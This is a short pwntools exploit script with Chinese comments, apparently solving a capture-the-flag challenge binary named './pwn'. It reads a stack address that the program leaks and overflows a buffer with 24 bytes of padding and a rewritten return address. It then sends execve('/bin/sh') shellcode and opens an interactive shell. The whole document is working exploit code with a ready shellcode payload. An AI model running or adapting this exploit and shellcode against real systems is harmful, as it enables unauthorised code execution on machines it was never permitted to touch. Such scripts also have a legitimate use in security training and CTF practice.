from pwn import *

# 1. 启动进程
p = process("./pwn")

# 2. 接收程序输出的 Gift 地址
# 程序会打印 "This is your gift : [0x7ffff...]"
# 我们先读到 "[" 之前
p.recvuntil(b"[") 
# 再读取地址字符串（即 0x... 那部分），读到 "]" 为止
leak_addr = p.recvuntil(b"]", drop=True) 

# 3. 将字符串地址转为整数
buf_addr = int(leak_addr, 16)
print(f"[+] Leaked stack address: {hex(buf_addr)}")

# 4. 动态计算跳转地址
# Shellcode 的位置 = buf起始地址 + 24字节填充 + 8字节返回地址
# 所以偏移量是 32
target_addr = buf_addr + 32
print(f"[+] Shellcode will be at: {hex(target_addr)}")

# 5. 准备 Shellcode
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

# 6. 发送 Payload
# 结构：[24字节填充] + [覆盖RET为target_addr] + [Shellcode]
payload = b"a"*24 + p64(target_addr) + shellcode
p.sendline(payload)

# 7. 拿 Shell
p.interactive()
